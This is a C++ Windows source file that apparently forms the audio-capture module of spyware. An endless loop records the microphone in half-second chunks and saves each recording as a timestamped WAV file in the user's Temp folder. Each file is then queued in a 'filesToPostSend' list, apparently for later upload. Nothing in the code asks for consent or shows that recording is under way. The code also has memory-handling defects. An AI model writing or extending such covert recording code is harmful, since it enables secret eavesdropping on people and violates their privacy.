#include "../headers/headers.hpp"

using namespace std;

void CALLBACK waveInCallback(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    bool* listenInProgress = reinterpret_cast<bool*>(dwInstance);
    *listenInProgress = (uMsg == WIM_OPEN);
}

int fillBuffer(WAVEFORMATEX &format, BYTE* bufferTabToWrite[], int bufferSize, int numSamples, bool &listenInProgress, int &buffersConsideredEmpty, int &buffersRecorded, bool &mustWriteBuffer) {
    bufferTabToWrite[buffersRecorded] = new BYTE[(int)(bufferSize)];
    if (bufferTabToWrite[buffersRecorded] == nullptr) {
        cerr << "Erreur d'allocation de memoire pour le buffer" << endl;
        return 1;
    }

    HWAVEIN hWaveIn = {0};
    if (waveInOpen(&hWaveIn, WAVE_MAPPER, &format, (DWORD_PTR)&waveInCallback, (DWORD_PTR)&listenInProgress, CALLBACK_FUNCTION) != MMSYSERR_NOERROR){
        cerr << "Impossible d'ouvrir l'entree audio" << endl;
        free(bufferTabToWrite[buffersRecorded]);
        return 1;
    }

    WAVEHDR waveHdr = {0};
    waveHdr.lpData = reinterpret_cast<LPSTR>(bufferTabToWrite[buffersRecorded]);
    waveHdr.dwBufferLength = numSamples * format.nBlockAlign;

    if (waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR)) != MMSYSERR_NOERROR) {
        cerr << "Erreur de preparation de l'entete audio" << endl;
        waveInClose(hWaveIn);
        free(bufferTabToWrite[buffersRecorded]);
        return 1;
    }

    if (waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR)) != MMSYSERR_NOERROR) {
        cerr << "Erreur de preparation de l'entete audio" << endl;
        waveInClose(hWaveIn);
        free(bufferTabToWrite[buffersRecorded]);
        return 1;
    }

    if (waveInStart(hWaveIn) != MMSYSERR_NOERROR) {
        cerr << "Erreur de démarrage de l'enregistrement." << endl;
        waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        free(bufferTabToWrite[buffersRecorded]);
        return 1;
    }

    while(listenInProgress){}

    startBufferAnalysisThread(numSamples, &buffersConsideredEmpty, &buffersRecorded, bufferTabToWrite[buffersRecorded], &mustWriteBuffer);

    return 0;
}

int writeBuffersListOnWaveFile(WAVEFORMATEX &format, int &tailleTotale, int &buffersRecorded, BYTE* bufferTabToWrite[], int &numSamples, string nomFichier) {
    const char* fileName = nomFichier.c_str();

    MMIOINFO mmioInfo = {0};
    HMMIO hFile = mmioOpen(const_cast<LPSTR>(fileName), &mmioInfo, MMIO_CREATE | MMIO_WRITE);
    if (hFile == NULL) {
        cerr << "Impossible d'ouvrir le fichier wave." << endl;
        return 1;
    }

    MMCKINFO ckRiff = {0};
    ckRiff.fccType = mmioFOURCC('W','A','V','E');
    ckRiff.cksize = 4 + 8 + 18 + 8 + (tailleTotale*buffersRecorded);
    if (mmioCreateChunk(hFile, &ckRiff, MMIO_CREATERIFF) != MMSYSERR_NOERROR) {
        cerr << "Impossible d'ecrire le chunk RIFF" << endl;
        mmioClose(hFile, 0);
        return 1;
    }

    MMCKINFO ckFmt = {0};
    ckFmt.ckid = mmioFOURCC('f','m','t',' ');
    ckFmt.cksize = sizeof(WAVEFORMATEX);
    if (mmioCreateChunk(hFile, &ckFmt, 0) != MMSYSERR_NOERROR) {
        cerr << "Impossible d'ecrire le chunk format" << endl;
        mmioClose(hFile, 0);
        return 1;
    }

    if (mmioWrite(hFile, reinterpret_cast<LPSTR>(&format), sizeof(WAVEFORMATEX)) == -1) {
        cerr << "Impossible d'ecrire les donnees format" << endl;
        mmioClose(hFile, 0);
        return 1;
    }

    MMCKINFO ckData = {0};
    ckData.ckid = mmioFOURCC('d','a','t','a');
    ckData.cksize = tailleTotale * buffersRecorded;
    if (mmioCreateChunk(hFile, &ckData, 0) != MMSYSERR_NOERROR) {
        cerr << "Impossible de creer le chunk de donnes" << endl;
        mmioClose(hFile, 0);
        return 1;
    }

    for (int i = 0; i<buffersRecorded; i++) {
        if (mmioWrite(hFile, reinterpret_cast<LPSTR>(bufferTabToWrite[i]), numSamples * format.nBlockAlign) == -1) {
            cerr << "Erreur d'ecriture des données audio dans le fichier WAV" << endl;
        }
        free(bufferTabToWrite[i]);
    }
    mmioClose(hFile, 0);
    return 0;
}

int listenOnce(string nomFichier){
    int sampleRate = 48000;
    float dureeBuffer = 0.5;
    int bitsPerSample = 24;
    int numChannels = 1;
    int numSamples = dureeBuffer * sampleRate * numChannels;
    int bufferSize = dureeBuffer * sampleRate * numChannels * bitsPerSample/8;
    int tailleTotale = numSamples * bitsPerSample / 8;

    BYTE* bufferTabToWrite[1024];

    int buffersRecorded = 0;
    int buffersConsideredEmpty = 0;

    bool listenInProgress = false;
    bool mustWriteBuffer = false;
    bool test = true;

    WAVEFORMATEX format;
    format.wFormatTag = WAVE_FORMAT_PCM;
    format.nChannels = numChannels;
    format.nSamplesPerSec = sampleRate;
    format.wBitsPerSample = bitsPerSample;
    format.nBlockAlign = format.nChannels * format.wBitsPerSample / 8;
    format.nAvgBytesPerSec = format.nSamplesPerSec * format.nBlockAlign;
    format.cbSize = 0;

    while(fillBuffer(format, bufferTabToWrite, bufferSize, numSamples, listenInProgress, buffersConsideredEmpty, buffersRecorded, mustWriteBuffer) == 0 && !mustWriteBuffer) {}

    writeBuffersListOnWaveFile(format, tailleTotale, buffersRecorded, bufferTabToWrite, numSamples, nomFichier);

    *(filesToPostSend.load()) += nomFichier + "\n";
    // cout << *(filesToPostSend.load()) << endl;

    return 0;
}

string trouverNomFichierWave(){
    /*
    Le nom du fichier sera composé de :
    (nom d'utilisateur -> date -> heure).wav
    */
    const DWORD size = UNLEN + 1;
    char usernameChar[size];
    GetUserNameA(usernameChar, const_cast<LPDWORD>(&size));
    string username = usernameChar;

    time_t now = time(nullptr);
    char buffer[80];
    strftime(buffer, sizeof(buffer), "%Y%m%d%H%M%S", localtime(&now));
    string dateHeure = buffer;
    
    string nomFichier = "C:\\Users\\" + username + "\\AppData\\Local\\Temp\\" + dateHeure + ".wav";
    
    return nomFichier;
}

void constantListen(){
    while(true){
        listenOnce(trouverNomFichierWave());
    }
}